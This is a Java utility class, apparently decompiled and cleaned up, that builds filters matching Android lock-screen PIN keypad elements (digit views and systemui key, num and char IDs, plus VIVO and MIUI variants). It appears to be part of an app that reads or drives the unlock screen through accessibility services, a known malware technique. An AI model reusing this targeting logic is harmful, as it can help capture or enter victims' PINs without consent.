package com.guard.wallet.utils;

import com.guard.wallet.condition.StringCondition;
import com.guard.wallet.filter.CombineFilter;
import java.util.LinkedList;

/**
 * 解锁界面 UI 过滤器工厂 — 为不同厂商锁屏界面构建 CombineFilter。
 */
public final class UnlockFilterFactory {
    private UnlockFilterFactory() {}

    private static StringCondition classNameCondition(String className) {
        StringCondition sc = new StringCondition();
        sc.setProperty("className");
        sc.setEquals(className);
        return sc;
    }

    private static StringCondition idPrefixCondition(String prefix) {
        StringCondition sc = new StringCondition();
        sc.setProperty("id");
        sc.setPrefix(prefix);
        return sc;
    }

    private static StringCondition idEqualsCondition(String id) {
        StringCondition sc = new StringCondition();
        sc.setProperty("id");
        sc.setEquals(id);
        return sc;
    }

    private static StringCondition descRegexCondition(String regex) {
        StringCondition sc = new StringCondition();
        sc.setProperty("desc");
        sc.setRegex(regex);
        return sc;
    }

    private static CombineFilter createFilter(StringCondition... conditions) {
        CombineFilter filter = new CombineFilter();
        filter.setStringConditions(new LinkedList<>());
        for (StringCondition sc : conditions) {
            filter.getStringConditions().add(sc);
        }
        return filter;
    }

    /** g.D0() — android.view.View + desc 匹配数字 */
    public static CombineFilter createDigitViewFilter() {
        return createFilter(classNameCondition("android.view.View"), descRegexCondition("\\d"));
    }

    /** g.r1() — systemui char_ 前缀 TextView */
    public static CombineFilter createSystemUiCharFilter() {
        return createFilter(classNameCondition("android.widget.TextView"),
                idPrefixCondition("com.android.systemui:id/char_"));
    }

    /** g.s1() — systemui num 前缀 TextView */
    public static CombineFilter createSystemUiNumFilter() {
        return createFilter(classNameCondition("android.widget.TextView"),
                idPrefixCondition("com.android.systemui:id/num"));
    }

    /** g.t1() — VIVO VivoPinkey ViewGroup */
    public static CombineFilter createVivoPinkeyFilter() {
        return createFilter(classNameCondition("android.view.ViewGroup"),
                idPrefixCondition("com.android.systemui:id/VivoPinkey"));
    }

    /** g.v() — systemui key 前缀 ViewGroup */
    public static CombineFilter createSystemUiKeyFilter() {
        return createFilter(classNameCondition("android.view.ViewGroup"),
                idPrefixCondition("com.android.systemui:id/key"));
    }

    /** g.y1() — MIUI 回车键 */
    public static CombineFilter createMiuiEnterFilter() {
        return createFilter(classNameCondition("android.widget.TextView"),
                idEqualsCondition("com.android.systemui:id/btn_letter_ok"));
    }
}
